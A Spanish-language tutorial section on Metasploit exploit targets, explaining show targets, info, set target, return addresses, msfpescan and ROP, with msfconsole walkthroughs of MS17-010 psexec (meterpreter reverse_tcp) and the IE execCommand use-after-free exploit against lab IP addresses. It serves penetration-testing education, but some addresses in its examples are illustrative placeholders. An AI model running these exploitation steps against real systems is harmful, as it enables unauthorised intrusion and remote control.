
# Sección 4: Targets (Objetivos) en Metasploit

## 📋 ¿Qué son los Targets?

Los **Targets** (objetivos) son **identificadores únicos de sistemas operativos** extraídos de las versiones de esos sistemas operativos específicos que adaptan el módulo de exploit seleccionado para ejecutarse en esa versión particular del sistema operativo.

### Definición Completa

> **Target**: Configuración específica que adapta un exploit para que funcione correctamente en una versión concreta de sistema operativo, arquitectura, service pack o configuración de software.

**Analogía**: 
```
Exploit = Llave maestra
Target = Adaptador específico para cada tipo de cerradura
```

La misma vulnerabilidad puede existir en múltiples versiones de un SO, pero cada versión requiere ajustes específicos en el exploit (direcciones de memoria, offsets, etc.).

---

## 🔍 Comando: show targets

### Uso Básico

El comando `show targets` emitido **dentro de la vista de un módulo de exploit** mostrará todos los targets vulnerables disponibles para ese exploit específico.

### Desde el Menú Raíz (Sin Módulo Seleccionado)

```bash
msf6 > show targets

[-] No exploit module selected.
```

**Mensaje**: Necesitas seleccionar un módulo de exploit primero.

### Desde un Módulo de Exploit

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   PowerShell
   2   Native upload
   3   MOF upload
```

---

## 🎯 Ejemplo Práctico: MS17-010 PSExec

### Visualizar Opciones del Módulo

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > options
```

**Salida**:

#### Module options (exploit/windows/smb/ms17_010_psexec):

```
Name                  Current Setting                          Required  Description
----                  ---------------                          --------  -----------
DBGTRACE              false                                    yes       Show extra debug trace info
LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                      rdlists/named_pipes.txt
RHOSTS                10.10.10.40                              yes       The target host(s)
RPORT                 445                                      yes       The Target port (TCP)
SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
SERVICE_DISPLAY_NAME                                           no        The service display name
SERVICE_NAME                                                   no        The service name
SHARE                 ADMIN$                                   yes       The share to connect to (ADMIN$, C$, etc.)
SMBDomain             .                                        no        The Windows domain to use for authentication
SMBPass                                                        no        The password for the specified username
SMBUser                                                        no        The username to authenticate as
```

#### Payload options (windows/meterpreter/reverse_tcp):

```
Name      Current Setting  Required  Description
----      ---------------  --------  -----------
EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
LHOST                      yes       The listen address (an interface may be specified)
LPORT     4444             yes       The listen port
```

#### Exploit target:

```
Id  Name
--  ----
0   Automatic
```

### Análisis del Target

**Target actual**: `0 - Automatic`

**Significado**: El exploit intentará **detectar automáticamente** la versión del sistema operativo y ajustarse en consecuencia.

---

## 🔄 Ejemplo con Múltiples Targets: IE execCommand

### Escenario

Cambiemos a un exploit que requiere rangos de targets más específicos:

**Exploit**: MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability

```bash
msf6 > use exploit/windows/browser/ie_execcommand_uaf
```

### Comando info (Información del Módulo)

```bash
msf6 exploit(windows/browser/ie_execcommand_uaf) > info
```

**Salida**:

```
       Name: MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability 
     Module: exploit/windows/browser/ie_execcommand_uaf
   Platform: Windows
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Good
  Disclosed: 2012-09-14

Provided by:
  unknown
  eromang
  binjo
  sinn3r <sinn3r@metasploit.com>
  juan vazquez <juan.vazquez@metasploit.com>

Available targets:
  Id  Name
  --  ----
  0   Automatic
  1   IE 7 on Windows XP SP3
  2   IE 8 on Windows XP SP3
  3   IE 7 on Windows Vista
  4   IE 8 on Windows Vista
  5   IE 8 on Windows 7
  6   IE 9 on Windows 7

Check supported:
  No

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  OBFUSCATE  false            no        Enable JavaScript obfuscation
  SRVHOST    0.0.0.0          yes       The local host to listen on
  SRVPORT    8080             yes       The local port to listen on
  SSL        false            no        Negotiate SSL for incoming connections
  SSLCert                     no        Path to a custom SSL certificate
  URIPATH                     no        The URI to use for this exploit (default is random)

Payload information:

Description:
  This module exploits a vulnerability found in Microsoft Internet 
  Explorer (MSIE). When rendering an HTML page, the CMshtmlEd object 
  gets deleted in an unexpected manner, but the same memory is reused 
  again later in the CMshtmlEd::Exec() function, leading to a 
  use-after-free condition. Please note that this vulnerability has 
  been exploited since Sep 14, 2012. Also, note that 
  presently, this module has some target dependencies for the ROP 
  chain to be valid. For WinXP SP3 with IE8, msvcrt must be present 
  (as it is by default). For Vista or Win7 with IE8, or Win7 with IE9, 
  JRE 1.6.x or below must be installed (which is often the case).

References:
  https://cvedetails.com/cve/CVE-2012-4969/
  OSVDB (85532)
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2012/MS12-063
  http://technet.microsoft.com/en-us/security/advisory/2757760
  http://eromang.zataz.com/2012/09/16/zero-day-season-is-really-not-over-yet/
```

---

## 🎓 Importancia del Comando info

### ¿Por Qué Usar info?

> El comando `info` puede ayudarnos siempre que **no estemos seguros** sobre los orígenes o la funcionalidad de diferentes exploits o módulos auxiliares.

### Mejores Prácticas

**Siempre es considerado una mejor práctica** auditar nuestro código para:
- Generación de artefactos
- "Características adicionales" no deseadas
- Comportamientos inesperados

**Flujo recomendado**:
```
1. Seleccionar módulo
   ↓
2. Ejecutar 'info'
   ↓
3. Leer descripción y referencias
   ↓
4. Ver targets disponibles
   ↓
5. Configurar módulo
   ↓
6. Ejecutar exploit
```

### Beneficios del Comando info

1. **Familiarizarnos con la funcionalidad del exploit**
2. **Asegurar un entorno de trabajo seguro y limpio** para clientes y nosotros
3. **Entender las dependencias** del exploit
4. **Conocer las referencias** (CVE, artículos técnicos)
5. **Identificar requisitos específicos** (ROP chains, DLLs necesarias, etc.)

---

## 📊 Visualización de Targets Disponibles

### Ver Targets del Módulo

```bash
msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7
```

### Análisis de Targets

**Observaciones**:
- ✅ Múltiples versiones de **Internet Explorer** (7, 8, 9)
- ✅ Múltiples versiones de **Windows** (XP SP3, Vista, 7)
- ✅ Target `0 - Automatic` disponible

### Target Automático vs Manual

#### Opción 1: Automatic (Automático)

```bash
# Dejar en Automatic
msf6 exploit(...) > set target 0
```

**Comportamiento**: 
- msfconsole realizará **detección de servicio** en el target dado
- Identificará automáticamente la versión correcta
- Seleccionará el target apropiado

**Ventajas**:
- ✅ Conveniente
- ✅ No requiere conocimiento previo
- ✅ Funciona en la mayoría de casos

**Desventajas**:
- ❌ Puede fallar la detección
- ❌ Menos control
- ❌ Puede elegir target incorrecto

#### Opción 2: Manual (Específico)

Si **conocemos** las versiones ejecutándose en nuestro target, podemos usar:

```bash
set target <index no.>
```

**Ejemplo**:
```bash
msf6 exploit(windows/browser/ie_execcommand_uaf) > set target 6

target => 6
```

**Resultado**: Target establecido a `IE 9 on Windows 7`

**Ventajas**:
- ✅ Control total
- ✅ Exploit optimizado para versión específica
- ✅ Mayor tasa de éxito
- ✅ Evita detección incorrecta

**Desventajas**:
- ❌ Requiere enumeración previa
- ❌ Si la información es incorrecta, el exploit fallará

---

## 🔬 Tipos de Targets

### Variabilidad entre Targets

Existe una **gran variedad de tipos de targets**. Cada target puede variar de otro por:

| Factor | Descripción | Ejemplo |
|--------|-------------|---------|
| **Service Pack** | Actualizaciones del SO | Windows 7 SP1 vs SP2 |
| **Versión del OS** | Diferentes releases | Windows XP vs Windows 7 |
| **Versión de idioma** | Packs de lenguaje | Inglés vs Español vs Japonés |
| **Arquitectura** | 32-bit vs 64-bit | x86 vs x64 |
| **Software instalado** | DLLs o frameworks adicionales | Java 1.6 instalado o no |

### Factores que Determinan el Target

Todo depende de:
- **Return address** (dirección de retorno)
- **Otros parámetros** en el target o dentro del módulo de exploit

---

## 🎯 Return Address (Dirección de Retorno)

### ¿Por Qué Varía la Return Address?

La **return address** puede variar porque:

#### 1. **Language Pack (Paquete de Idioma)**

Diferentes idiomas cambian las direcciones de memoria debido a:
- Cadenas de texto de diferentes longitudes
- Recursos en diferentes ubicaciones
- DLLs localizadas

**Ejemplo**:
```
Windows XP SP3 (Inglés): 0x7C86467B
Windows XP SP3 (Español): 0x7C86489A
```

#### 2. **Versiones de Software Diferentes**

Actualizaciones y parches cambian:
- Código compilado
- Ubicaciones de funciones
- Direcciones de memoria

**Ejemplo**:
```
IE 8.0.6001.18702: 0x3C56F768
IE 8.0.6001.18939: 0x3C56F7A2
```

#### 3. **Hooks y Modificaciones**

Addresses desplazadas debido a:
- Software de seguridad (AV, HIPS)
- Aplicaciones que modifican memoria
- Drivers que inyectan código

---

## 🔑 Tipos de Return Address

### 1. jmp esp

**Descripción**: Salto al registro ESP (Stack Pointer)

**Uso**: Buffer overflow clásico

**Ejemplo**:
```assembly
; Return address apunta a instrucción:
jmp esp
; Ejecuta código en el stack
```

### 2. Jump to Specific Register

**Descripción**: Salto a un registro específico que identifica el target

**Registros comunes**:
- `jmp eax`
- `jmp ebx`
- `jmp ecx`
- `jmp edx`

### 3. pop/pop/ret

**Descripción**: Secuencia de instrucciones para ajustar el stack

**Uso**: SEH (Structured Exception Handling) exploits

**Ejemplo**:
```assembly
pop eax    ; Eliminar valor del stack
pop ebx    ; Eliminar otro valor
ret        ; Retornar a dirección controlada
```

### Más Información

Para más detalles sobre return addresses, consulta el módulo:
> **Stack-Based Buffer Overflows on Windows x86**

---

## 🔍 Identificación Correcta de Targets

### Proceso de Identificación

Para identificar un target correctamente, necesitaremos:

#### Paso 1: Obtener Copia de Binarios del Target

```bash
# Desde el target comprometido
meterpreter > download C:\\Windows\\System32\\kernel32.dll /root/analysis/
meterpreter > download C:\\Windows\\System32\\ntdll.dll /root/analysis/
```

**Propósito**: Analizar las direcciones exactas en esa versión específica

#### Paso 2: Usar msfpescan para Localizar Return Address

**msfpescan**: Herramienta de Metasploit para buscar instrucciones específicas en binarios PE (Portable Executable)

**Sintaxis básica**:
```bash
msfpescan -j esp kernel32.dll
```

**Opciones comunes**:
```bash
# Buscar "jmp esp"
msfpescan -j esp <archivo.dll>

# Buscar "pop pop ret"
msfpescan -p <archivo.dll>

# Buscar instrucciones específicas
msfpescan -r <registro> <archivo.dll>
```

**Ejemplo de salida**:
```
0x7c86467b   jmp esp   |  {PAGE_EXECUTE_READ}   [kernel32.dll]
0x7c86489a   jmp esp   |  {PAGE_EXECUTE_READ}   [kernel32.dll]
0x7c9c1a4f   jmp esp   |  {PAGE_EXECUTE_READ}   [shell32.dll]
```

#### Paso 3: Validar la Dirección

1. Verificar que esté en módulo confiable (no ASLR, no DEP)
2. Confirmar que no contiene caracteres malos (null bytes, etc.)
3. Probar en el exploit

---

## 🧪 Análisis de Código de Exploit

### Comentarios en el Código

Los **comentarios en el código del módulo de exploit** pueden ayudarnos a determinar por qué se define el target de esa manera.

**Ejemplo de código de exploit**:

```ruby
# exploit/windows/browser/ie_execcommand_uaf.rb

'Targets' =>
[
  [ 'Automatic', {} ],
  [ 'IE 7 on Windows XP SP3',
    {
      'Ret'  => 0x3C56F768,  # jmp esp - msvcrt.dll
      'Offset' => 0x5F4
    }
  ],
  [ 'IE 8 on Windows XP SP3',
    {
      'Ret'  => 0x77c15ed5,  # xchg eax, esp # ret - msvcrt.dll
      'Offset' => 0x5F4
    }
  ],
  # ...
]
```

**Análisis del código**:
- `'Ret'`: Dirección de retorno específica para ese target
- `'Offset'`: Desplazamiento necesario
- Comentario indica la instrucción y DLL donde se encuentra

---

## 📚 Ejemplos Prácticos de Selección de Targets

### Escenario 1: Target Automático (Recomendado para Principiantes)

```bash
# 1. Usar exploit
msf6 > use exploit/windows/smb/ms17_010_psexec

# 2. Configurar
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 10.10.14.15

# 3. Dejar target en Automatic (por defecto)
msf6 exploit(windows/smb/ms17_010_psexec) > show options
# Exploit target:
#   Id  Name
#   --  ----
#   0   Automatic

# 4. Ejecutar
msf6 exploit(windows/smb/ms17_010_psexec) > exploit
```

**Resultado**: Metasploit detecta automáticamente la versión de Windows y ajusta el exploit.

---

### Escenario 2: Target Específico (Avanzado)

**Contexto**: Ya enumeraste el objetivo y sabes que es **IE 9 en Windows 7**

```bash
# 1. Usar exploit
msf6 > use exploit/windows/browser/ie_execcommand_uaf

# 2. Ver targets disponibles
msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7  ← Este es nuestro target

# 3. Seleccionar target específico
msf6 exploit(windows/browser/ie_execcommand_uaf) > set target 6
target => 6

# 4. Verificar
msf6 exploit(windows/browser/ie_execcommand_uaf) > show options

Exploit target:

   Id  Name
   --  ----
   6   IE 9 on Windows 7  ← Confirmado

# 5. Configurar resto de opciones
msf6 exploit(windows/browser/ie_execcommand_uaf) > set SRVHOST 10.10.14.15
msf6 exploit(windows/browser/ie_execcommand_uaf) > set URIPATH /exploit

# 6. Ejecutar
msf6 exploit(windows/browser/ie_execcommand_uaf) > exploit
```

**Resultado**: Exploit optimizado específicamente para IE 9 en Windows 7.

---

### Escenario 3: Cambiar Target Durante la Explotación

```bash
# Primer intento con Automatic
msf6 exploit(windows/browser/ie_execcommand_uaf) > set target 0
msf6 exploit(windows/browser/ie_execcommand_uaf) > exploit

# Si falla...
[*] Exploit completed, but no session was created.

# Cambiar a target específico basado en enumeración
msf6 exploit(windows/browser/ie_execcommand_uaf) > set target 5
msf6 exploit(windows/browser/ie_execcommand_uaf) > exploit

# Si sigue fallando, probar otro target
msf6 exploit(windows/browser/ie_execcommand_uaf) > set target 6
msf6 exploit(windows/browser/ie_execcommand_uaf) > exploit

# Éxito
[*] Meterpreter session 1 opened
```

---

## 🎓 Mejores Prácticas para Targets

### 1. Siempre Usar info Primero

```bash
msf6 exploit(...) > info
```

**Beneficios**:
- Ver todos los targets disponibles
- Leer la descripción del exploit
- Entender dependencias

### 2. Enumerar Antes de Explotar

**Información necesaria**:
- Versión exacta del OS
- Service Pack
- Arquitectura (x86 vs x64)
- Software instalado (Java, .NET, etc.)
- Idioma del sistema

**Herramientas de enumeración**:
```bash
# Desde Metasploit
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 10.10.10.40
msf6 auxiliary(scanner/smb/smb_version) > run

# Desde Nmap
nmap -sV -O 10.10.10.40
```

### 3. Probar Automatic Primero

Si no estás seguro de la versión exacta:
- Intentar con `target 0` (Automatic)
- Si falla, realizar enumeración más profunda
- Seleccionar target específico

### 4. Leer el Código del Módulo

```bash
# Ver el código del exploit
cat /usr/share/metasploit-framework/modules/exploits/windows/browser/ie_execcommand_uaf.rb
```

**Buscar**:
- Sección `'Targets'`
- Comentarios sobre direcciones de retorno
- Dependencias de software

### 5. Documentar Targets que Funcionan

Mantén un registro de qué targets funcionan para qué sistemas:

```
Windows 7 Professional SP1 x64 (Inglés)
- IE 9: Target 6 - ÉXITO
- MS17-010 PSExec: Target 0 (Automatic) - ÉXITO

Windows XP SP3 x86 (Español)
- IE 7: Target 1 - FALLO
- IE 8: Target 2 - ÉXITO
```

---

## 🔧 Troubleshooting: Problemas Comunes con Targets

### Problema 1: "Exploit completed, but no session was created"

**Causa posible**: Target incorrecto seleccionado

**Solución**:
```bash
# Ver targets disponibles
msf6 exploit(...) > show targets

# Probar diferente target
msf6 exploit(...) > set target 1
msf6 exploit(...) > exploit

# Si sigue fallando, verificar enumeración
```

### Problema 2: Exploit se cuelga o crash del objetivo

**Causa posible**: Return address incorrecta para esa versión

**Solución**:
```bash
# Verificar versión exacta del target
# Buscar exploit alternativo
msf6 > search <servicio> <versión>

# O usar exploit más genérico
```

### Problema 3: Payload no se ejecuta

**Causa posible**: Dependencias faltantes (Java, .NET, DLLs)

**Solución**:
```bash
# Leer descripción del exploit
msf6 exploit(...) > info

# Ejemplo de IE execCommand:
# "For Vista or Win7 with IE8, or Win7 with IE9, 
#  JRE 1.6.x or below must be installed"

# Verificar si Java está instalado en el target
```

---

## 📖 Conceptos Avanzados

### ROP Chains (Return-Oriented Programming)

Algunos exploits modernos usan **ROP chains** en lugar de simple return address.

**Concepto**: Encadenar múltiples "gadgets" (pequeñas secuencias de instrucciones) para ejecutar código.

**Ejemplo en el código**:
```ruby
'Targets' =>
[
  [ 'IE 9 on Windows 7',
    {
      'Rop' => true,
      'RopVirtualAlloc' => 0x1234abcd,
      'RopWriteProcessMemory' => 0x5678ef90,
      # ... más gadgets
    }
  ]
]
```

**Dependencias de ROP**:
- Versiones específicas de DLLs
- Sin ASLR (Address Space Layout Randomization)
- Gadgets disponibles en binarios del sistema

### DEP y ASLR

**DEP (Data Execution Prevention)**: Previene ejecución de código en el stack

**ASLR (Address Space Layout Randomization)**: Randomiza direcciones de memoria

**Implicación para Targets**:
- Exploits antiguos fallan en sistemas con DEP/ASLR
- Targets modernos requieren técnicas de bypass (ROP, JIT spraying, etc.)
- Exploits tienen targets específicos para versiones con/sin protecciones

---



---

## 🔑 Conceptos Clave para Recordar

1. **Targets** adaptan exploits a versiones específicas de OS
2. **Automatic** es conveniente pero menos preciso
3. **Target específico** requiere enumeración pero es más confiable
4. **Return address** es el factor principal que define targets
5. **Language packs, service packs y software** afectan las direcciones
6. **info** es tu mejor amigo antes de explotar
7. **Enumeración** es crítica para selección correcta de target
8. **ROP chains** son necesarios en sistemas con DEP/ASLR

---

## 💡 Ejercicio Práctico

### Desafío: Selección de Target Correcto

**Escenario**: 
- Target: Windows 7 Professional SP1
- Navegador: Internet Explorer 9
- Versión del OS: Inglés

**Tareas**:
1. Buscar exploit para IE9 en Metasploit
2. Ver targets disponibles
3. Seleccionar el target correcto
4. Configurar el exploit
5. Documentar el proceso

**Solución**:
```bash
# 1. Buscar
msf6 > search ie9 type:exploit

# 2. Seleccionar módulo
msf6 > use exploit/windows/browser/ie_execcommand_uaf

# 3. Ver info
msf6 exploit(...) > info

# 4. Ver targets
msf6 exploit(...) > show targets

# 5. Seleccionar IE 9 on Windows 7
msf6 exploit(...) > set target 6

# 6. Configurar
msf6 exploit(...) > set SRVHOST 10.10.14.15

# 7. Ejecutar
msf6 exploit(...) > exploit
```

---

## 🎓 Conclusión

La **correcta selección de targets** es fundamental para el éxito de la explotación. Requiere:

- ✅ **Enumeración exhaustiva** del objetivo
- ✅ **Comprensión del exploit** y sus dependencias
- ✅ **Conocimiento de arquitecturas** y versiones de OS
- ✅ **Paciencia** para probar diferentes targets si es necesario

**Recuerda**: Un exploit fallido no significa que el sistema no sea vulnerable, puede ser simplemente un target incorrecto.

---

